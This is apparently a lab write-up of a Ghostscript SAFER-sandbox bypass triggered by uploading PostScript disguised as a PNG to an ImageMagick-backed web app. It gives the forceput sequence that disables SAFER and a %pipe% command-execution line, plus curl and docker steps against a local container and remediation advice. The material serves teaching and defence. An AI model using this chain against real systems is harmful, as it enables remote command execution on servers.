## Vulnerability Mechanics

### Technical Root Cause

Ghostscript implements a sandboxing mode (`-dSAFER`) to isolate untrusted PostScript operations by restricting file operations and disabling external system commands (such as `%pipe%` shell command execution).

In Artifex Ghostscript versions prior to 9.27, certain pseudo-operators (such as `.actual_pdfpaintproc` in `pdf_draw.ps`) pushed executable arrays containing privileged internal operators (specifically `.forceput`) onto the operand stack without `executeonly` restrictions. Because routines looked up identifier names in `dictstack` at runtime rather than executing fully bound operator objects, a malicious PostScript document can push a custom dictionary onto `dictstack` to force a controlled `/typecheck` error.

The attacker's custom `errordict /typecheck` error handler intercepts execution, recovers `.forceput` from the operand stack, and uses it to overwrite security properties in `systemdict` and `userparams`:

- `systemdict /SAFER false forceput`
- `userparams /LockFilePermissions false forceput`
- `systemdict /userparams get /PermitFileControl [(*)] forceput`
- `systemdict /userparams get /PermitFileWriting [(*)] forceput`
- `systemdict /userparams get /PermitFileReading [(*)] forceput`

Once `SAFER` mode is disabled, the payload utilizes the Ghostscript `%pipe%` device feature (e.g. `(%pipe%id > /tmp/success) (w) file closefile`) to execute arbitrary operating system commands with the privileges of the web application.

## Exploitation & Verification Walkthrough

### 1. Health Check

Verify the vulnerable web application is running and serving the file upload interface on port 8222:

```bash
curl -i -s http://localhost:8222/
```

Expected response includes `HTTP/1.1 200 OK` and the HTML form `<input type="file" name="file_upload">`.

### 2. Exploitation via Web Upload

Submit the crafted PostScript payload masked with an allowed image extension (`poc.png`):

```bash
curl -i -s -F "file_upload=@poc.png" http://localhost:8222/
```

When PHP receives the upload, it executes:

```bash
identify -format '%w x %h' /tmp/phpXXXXXX
```

ImageMagick delegates the PostScript parsing to Ghostscript, which executes the embedded PostScript commands.

### 3. Verify Execution Inside Container

Inspect `/tmp/success` generated by the payload command `id > /tmp/success`:

```bash
docker exec cyberlab_02_ghostscript_6116 cat /tmp/success
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4. CLI Direct Verification

The vulnerability can also be exercised directly via the CLI inside the container:

```bash
docker exec cyberlab_02_ghostscript_6116 identify /var/www/html/poc.png
```

## Defensive Remediation & Hardening

1. **Upgrade Ghostscript**:
   Upgrade Ghostscript to version 9.27 or higher, where pseudo-operators are strictly isolated and internal dictionaries are protected from caller modification.
2. **Harden ImageMagick Policy**:
   Disable PostScript delegate handlers in `/etc/ImageMagick-7/policy.xml` (or `/etc/ImageMagick/policy.xml`) by adding:
   ```xml
   <policymap>
     <policy domain="coder" rights="none" pattern="PS" />
     <policy domain="coder" rights="none" pattern="EPS" />
     <policy domain="coder" rights="none" pattern="PDF" />
     <policy domain="coder" rights="none" pattern="XPS" />
   </policymap>
   ```
